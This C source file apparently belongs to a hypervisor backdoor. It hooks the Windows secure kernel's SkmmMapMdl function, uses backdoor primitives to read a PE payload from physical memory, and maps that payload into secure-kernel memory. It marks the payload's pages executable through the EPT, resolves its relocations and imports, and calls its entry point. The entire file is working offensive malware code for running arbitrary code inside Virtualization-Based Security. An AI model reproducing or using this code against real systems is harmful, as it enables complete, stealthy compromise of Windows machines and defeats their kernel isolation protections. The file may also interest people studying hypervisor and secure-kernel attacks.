#include "stdafx.h"

// size of the call stub
#define MAX_CALLGATE_LEN 0x40

typedef NTSTATUS (NTAPI * func_SkmmMapMdl)(PMDL Mdl, ULONG_PTR Protection);

// parameters passed from the backdoor client
DRIVER_SK_PARAMS m_Params;

// callgate for original securekernel!SkmmMapMdl()
UCHAR old_SkmmMapMdl[MAX_CALLGATE_LEN];
//--------------------------------------------------------------------------------------
void *bd_alloc(size_t size)
{
    // heap alloc
    return I_SkAllocatePool(NonPagedPool, size, 0);
}

void bd_free(void *addr)
{
    // heap free
    I_SkFreePool(NonPagedPool, addr);
}

void bd_sleep(int msec)
{
    // not implemented
}

void bd_yeld(void)
{
    // not implemented
}

void bd_printf(char *format, ...)
{
    // not implemented
}
//--------------------------------------------------------------------------------------
BOOLEAN PayloadMakeExecutable(uint64_t EptAddr, PVOID Mem, ULONG MemSize)
{
    for (ULONG i = 0; i < MemSize / PAGE_SIZE; i += 1)
    {
        uint64_t Addr = (uint64_t)RVATOVA(Mem, PAGE_SIZE * i);

        // make page executable
        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, Addr, cr3_get(), EptAddr) != 0)
        {
            I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"() ERROR: backdoor_make_exec_pt() fails\n");
            return FALSE;
        }
    }

    bd_yeld();

    return TRUE;
}
//--------------------------------------------------------------------------------------
PVOID PayloadAlloc(uint64_t EptAddr)
{
    ULONG MemSize = (m_Params.payload_pages_count + 1) * PAGE_SIZE;

    // allocate memory for the payload
    PVOID Mem = I_SkAllocatePool(NonPagedPool, MemSize, 0);
    if (Mem)
    {
        // align heap address by page boundary
        PVOID Image = (PVOID)_ALIGN_UP((ULONG_PTR)Mem, PAGE_SIZE);

        memset(Mem, 0, MemSize);        

        I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Memory is at "IFMT", 0x%x bytes\n", Image, MemSize);

        // make payload memory executable
        if (PayloadMakeExecutable(EptAddr, Image, MemSize))
        {
            return Image;
        }

        I_SkFreePool(NonPagedPool, Mem);
    }
    else
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: SkAllocatePool() fails\n");
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID PayloadRun(uint64_t EptAddr)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_Params.driver_base, ((PIMAGE_DOS_HEADER)m_Params.driver_base)->e_lfanew);

    // allocate memory for the payload data
    ULONG DataSize = m_Params.payload_pages_count * PAGE_SIZE;
    PVOID Data = I_SkAllocatePool(NonPagedPool, DataSize, 0);
    if (Data == NULL)
    {
        goto _end;
    }

    for (ULONG i = 0; i < m_Params.payload_pages_count; i += 1)
    {
        uint64_t PhysAddr = 0, Addr = (uint64_t)m_Params.payload_base + (PAGE_SIZE * i);

        // get physical address of the payload page
        if (backdoor_virt_translate(Addr, &PhysAddr, m_Params.payload_pml4, m_Params.payload_ept) != 0)
        {
            I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"() ERROR: backdoor_virt_translate() fails\n");
            goto _end;
        }

        // read payload page from the physical memory
        if (backdoor_phys_read(PhysAddr, RVATOVA(Data, PAGE_SIZE * i), PAGE_SIZE) != 0)
        {
            I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"() ERROR: backdoor_phys_read() fails\n");
            goto _end;
        }
    }

    I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): %d payload memory pages read\n", m_Params.payload_pages_count);

    pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

    // allocate memory for the payload image
    ULONG ImageSize = _ALIGN_UP(pHeaders->OptionalHeader.SizeOfImage, PAGE_SIZE);
    PVOID Mem = I_SkAllocatePool(NonPagedPool, ImageSize + PAGE_SIZE, 0);
    if (Mem == NULL)
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: SkAllocatePool() fails\n");
        goto _end;
    }

    // align heap address by page boundary
    PVOID Image = (PVOID)_ALIGN_UP((ULONG_PTR)Mem, PAGE_SIZE);

    I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Payload image is at "IFMT", 0x%x bytes\n", Image, ImageSize);

    // copy payload headers
    memset(Image, 0, ImageSize);
    memcpy(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    // copy payload sections
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        memcpy(
            RVATOVA(Image, pSection->VirtualAddress),
            RVATOVA(Data, pSection->PointerToRawData),
            min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
        );

        pSection += 1;
    }

    // make payload memory executable
    if (!PayloadMakeExecutable(EptAddr, Image, ImageSize))
    {
        goto _end;
    }

    // flush TLB and invalidate CPU caches
    backdoor_invalidate_caches();
    bd_yeld();

    if (!LdrProcessRelocs(Image, Image))
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: LdrProcessRelocs() fails\n");
        goto _end;
    }

    if (!RuntimeProcessImports(Image))
    {
        I_DbgPrintEx(DBG_ID, DBG_LEVEL, "ERROR: RuntimeProcessImports() fails\n");
        goto _end;
    }

    PDRIVER_INITIALIZE DriverInit = (PDRIVER_INITIALIZE)
        RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

    // call payload image entry point
    Status = DriverInit(NULL, NULL);

    I_DbgPrintEx(DBG_ID, DBG_LEVEL, __FUNCTION__"(): Status = 0x%.8x\n", Status);

_end:

    if (Data)
    {
        I_SkFreePool(NonPagedPool, Data);
    }

    if (!NT_SUCCESS(Status))
    {
        if (Mem)
        {
            I_SkFreePool(NonPagedPool, Mem);
        }

        return NULL;
    }

    return Image;
}
//--------------------------------------------------------------------------------------
void DriverMain(void)
{ 
    uint64_t InfoAddr = 0, EptAddr = 0;
    uint32_t Val = 0;

    lock_aquire();

    // get call counter address
    if (backdoor_ept_info_addr(&InfoAddr) == 0)
    {
        // read call counter
        if (backdoor_virt_read_32(InfoAddr + DRIVER_SK_INFO_COUNT, &Val) == 0)
        {
            // check if hook handler wasn't executed yet
            if (Val == 0)
            {
                PVOID ImageAddr = NULL;

                // get current EPT address
                if (backdoor_ept_addr(&EptAddr) == 0)
                {
                    I_DbgPrintEx(
                        DBG_ID, DBG_LEVEL, __FUNCTION__"(): CR3 = 0x%llx, EPT is at 0x%llx\n",
                        cr3_get(), EptAddr
                    );

                    if (m_Params.payload_base != NULL)
                    {
                        // load and execute payload
                        ImageAddr = PayloadRun(EptAddr);
                    }
                    else
                    {
                        // just allocate kernel memoty for the payload
                        ImageAddr = PayloadAlloc(EptAddr);                        
                    }
                }                

                // allocated memory address
                backdoor_virt_write_64(InfoAddr + DRIVER_SK_INFO_ADDR, (uint64_t)ImageAddr);
            }

            // update call counter
            backdoor_virt_write_32(InfoAddr + DRIVER_SK_INFO_COUNT, Val + 1);
        }
    }

    lock_release();
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI new_SkmmMapMdl(PMDL Mdl, ULONG_PTR Protection)
{
    // exeute main function
    DriverMain();

    // call original function
    return ((func_SkmmMapMdl)&old_SkmmMapMdl)(Mdl, Protection);
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    return STATUS_UNSUCCESSFUL;
}
//--------------------------------------------------------------------------------------
// EoF
